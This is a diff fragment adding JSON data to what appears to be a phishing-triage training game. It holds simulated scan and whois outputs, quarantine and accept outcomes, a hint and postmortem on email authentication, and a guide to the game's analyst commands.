+        "scan id_021": "Scan result: Analysis completed. Found: Sender domain mismatch, external server origin (203.0.113.50), SPF check: softfail.",
+        "whois portal.companies.xyz": "Domain: portal.companies.xyz\nRegistrar: Global Domain Registry\nCreated: 2025-10-07\nCountry: Unknown\nStatus: Recently registered",
+        "whois 203.0.113.50": "IP: 203.0.113.50\nOrganization: Unknown Hosting\nCountry: Unknown\nASN: Not in company IP ranges",
+        "quarantine id_021": "Email quarantined successfully. Moved to secure isolation. Incident logged.",
+        "accept id_021": "Illegitimate email accepted. This was a phishing attack."
+      },
+      "hint": "Always verify email authenticity by checking headers and sender information. Pay attention to domain names in links and email addresses. Consider why an email might request urgent action.",
+      "postmortem": "Email security relies on multiple verification systems like SPF and DKIM. External domains masquerading as internal services can lead to data compromise."
+    }
+  ],
+  "commands_guide": {
+    "cat": "prints the content of a file or email body. Usage: cat <id or path>",
+    "headers": "shows email headers. Usage: headers <email_id>",
+    "ls": "list files in a USB or directory. Usage: ls <usb_id or path>",
+    "strings": "returns printable strings in a binary/executable to hint at behavior. Usage: strings <file>",
+    "scan": "simple heuristic scan returning suspicious indicators. Usage: scan <id>",
+    "quarantine": "moves item to quarantine. Usage: quarantine <id>",
+    "whois": "lookup of an IP/domain. Usage: whois <id_or_ip_or_domain>",
+    "block_ip": "adds firewall block for IP. Usage: block_ip <ip>",
+    "accept": "marks legitimate items as safe and processes them. Usage: accept <id>",
+    "hint": "shows a small hint for the incident. Usage: hint <id>",
+    "run": "executes a command or script. Usage: run <email_id/file>"
+  }
+}
